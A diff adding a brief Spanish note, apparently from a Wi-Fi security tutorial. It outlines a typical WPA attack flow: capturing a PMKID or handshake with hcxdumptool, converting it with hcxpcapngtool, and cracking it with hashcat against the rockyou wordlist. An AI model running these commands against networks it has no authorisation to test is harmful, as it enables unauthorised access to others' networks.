@@ -1,0 +1,23 @@
+3. Flujo típico de ataque usando hcxtools + hcxkeys
+
+Capturas PMKID o 4-way handshake
+
+hcxdumptool -i wlan0mon -o captura.pcapng --active_beacon
+
+
+Conviertes la captura para Hashcat
+
+hcxpcapngtool -o hash.22000 captura.pcapng
+
+
+Opcional: gestionas claves con hcxkeys
+
+Precomputar PMK
+
+Verificar combinaciones SSID/clave
+
+Generar diccionarios derivados
+
+Crackeo en Hashcat
+
+hashcat -m 22000 hash.22000 rockyou.txt
